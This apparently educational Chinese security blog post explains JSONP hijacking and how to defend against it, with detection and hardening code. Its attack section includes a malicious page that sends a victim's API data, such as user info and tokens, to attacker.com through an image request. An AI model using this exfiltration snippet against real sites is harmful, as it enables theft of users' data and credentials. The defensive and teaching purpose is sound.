#  JSONP劫持漏洞攻防指南   
 黑曜网安实验室   2025-05-07 10:35  
  
# 一、JSONP技术原理剖析  
### 1.1 核心机制  
  
JSONP（JSON with Padding）是一种基于动态脚本注入的跨域通信技术，其核心原理如下：  
```
// 客户端定义回调处理函数
function handleResponse(data) {
  console.log("接收数据:", data);
}

// 创建动态脚本标签
const script = document.createElement('script');
script.src = 'http://api.example.com/data?callback=handleResponse';
document.body.appendChild(script);
```  
### 1.2 技术特点  
<table><thead><tr><th style="color: rgb(64, 64, 64);padding: 10px 10px 10px 0px;border-bottom: 1px solid rgb(187, 187, 187);border-top: none;font-weight: 600;font-size: 15px;line-height: 1.72;border-right-color: rgb(187, 187, 187);border-left-color: rgb(187, 187, 187);text-align: left;"><section><span leaf="">特征</span></section></th><th style="color: rgb(64, 64, 64);padding: 10px;border-bottom: 1px solid rgb(187, 187, 187);border-top: none;font-weight: 600;font-size: 15px;line-height: 1.72;border-right-color: rgb(187, 187, 187);border-left-color: rgb(187, 187, 187);text-align: left;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="padding: 10px 10px 10px 0px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">传输方式</span></section></td><td style="padding: 10px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">仅支持GET请求</span></section></td></tr><tr><td style="padding: 10px 10px 10px 0px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">数据格式</span></section></td><td style="padding: 10px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">JavaScript可执行代码</span></section></td></tr><tr><td style="padding: 10px 10px 10px 0px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">依赖条件</span></section></td><td style="padding: 10px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">服务端需实现回调封装逻辑</span></section></td></tr><tr><td style="padding: 10px 10px 10px 0px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">安全风险</span></section></td><td style="padding: 10px;border-bottom: 1px solid rgb(229, 229, 229);font-size: 15px;line-height: 1.72;border-top-color: rgb(229, 229, 229);border-right-color: rgb(229, 229, 229);border-left-color: rgb(229, 229, 229);min-width: 100px;max-width: max(30vw, 320px);"><section><span leaf="">易受XSS和CSRF攻击</span></section></td></tr></tbody></table>### 1.3 通信流程图解  
```
[客户端]                    [服务端]
   |-- 1.定义回调函数---------->|
   |-- 2.发起跨域请求(callback)-->|
   |                           |-- 3.构造JS响应
   |<--4.执行回调函数(含数据)----|
```  
## 二、JSONP劫持攻击深度解析  
### 2.1 攻击场景还原  
  
**实验环境搭建：**  
```
# 启动模拟服务（需Node.js环境）
npm install express
node jsonp-server.js
```  
  
**恶意页面代码示例：**  
```
<!-- 攻击者服务器上的exploit.html -->
<script>
function stealData(payload) {
  // 数据外传技术：使用Image对象绕过CORS
  const exfil = new Image();
  exfil.src = `http://attacker.com/log?data=${btoa(JSON.stringify(payload))}`;
}
</script>
<script src="http://vuln-domain.com/api?callback=stealData"></script>
```  
### 2.2 漏洞验证流程  
### 接口发现：  
  
使用BurpSuite抓包，过滤包含以下参数的请求：****  
```
GET /userinfo?jsonp=callback123 HTTP/1.1
Host: target.com
```  
  
**敏感数据检测：**  
  
浏览器控制台输出示例：  
```
handleResponse({user: "admin", token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."})
```  
1. PoC构造验证：  
  
```
<!-- 本地验证脚本 -->
<iframe srcdoc='
  <script>
  function poc(data){alert(JSON.stringify(data))}
  </script>
  <script src="http://target.com/api?callback=poc"></script>
'></iframe>
```  
### 2.3 自动化检测脚本  
```
import requests

def detect_jsonp(url):
    params = {
        'callback': 'test',
        'jsonp': 'test',
        'cb': 'test'
    }
    try:
        resp = requests.get(url, params=params)
        if resp.text.startswith('test('):
            print(f"[!] 漏洞存在: {resp.url}")
    except Exception as e:
        print(f"检测异常: {str(e)}")

# 示例检测
detect_jsonp('http://test.com/userinfo')
```  
## 三、防御方案全景图  
### 3.1 多层级防御矩阵  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2urYTeQV6azQ3Khm4iafxtrx3w2agic4YhEw9ib4mfTiaoFw9UToIVacB5Msq0K6cQIQiarC7KT8OBL5e4g/640?wx_fmt=png&from=appmsg "")  
### 3.2 代码级防护示例  
  
**Node.js防御实现：**  
```
app.get('/api', (req, res) => {
  // 校验Referer白名单
  const validReferers = ['https://trusted.com'];
  if (!validReferers.includes(req.headers.referer)) {
    return res.status(403).send('Access denied');
  }

  // 强制指定回调函数名
  const callback = 'secureCallback';
  const data = JSON.stringify({user: 'demo'});
  res.set('X-Content-Type-Options', 'nosniff');
  res.send(`${callback}(${data})`);
});
```  
  
**Nginx反向代理配置：**  
```
location /api {
    # 限制跨域访问
    if ($http_origin !~* (example.com|trusted.org)) {
        return 403;
    }

    # 过滤危险参数
    if ($args ~* callback=) {
        return 400;
    }

    proxy_pass http://backend;
}
```  
## 四、现代替代方案  
### 4.1 CORS标准配置  
```
Access-Control-Allow-Origin: https://trusted-domain.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```  
### 4.2 OAuth 2.0安全流程  
```
[Client] --1. Auth Request--> [Auth Server]
[Client] <--2. Auth Code--- [Auth Server]
[Client] --3. Code+Secret--> [Auth Server]
[Client] <--4. Access Token-- [Auth Server]
[Client] --5. Token--> [Resource Server]
```  
## 五、知识延伸  
  
根据MITRE CWE最新分类：  
- **CWE-352**  
: Cross-Site Request Forgery  
  
- **CWE-942**  
: 过度许可的跨域白名单  
  
- **CWE-1021**  
: 不当的Rest API授权  
  
****  
**安全警示**  
：OWASP 2023报告显示，虽然JSONP使用率下降至7%，但其中仍有35%的接口存在敏感数据泄露风险。建议企业定期进行接口  
  
  
资料发放处  
  
如果需要网络安全学习资料可以加一下我们的KUKI师傅  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XvnzjMsl2urYTeQV6azQ3Khm4iafxtrx3ka15HqrCR3bo86tqM7jfVahCjFficLibaNgpHwbX6O1HuXFBE9bE3zCg/640?wx_fmt=webp&from=appmsg "")  
  
  
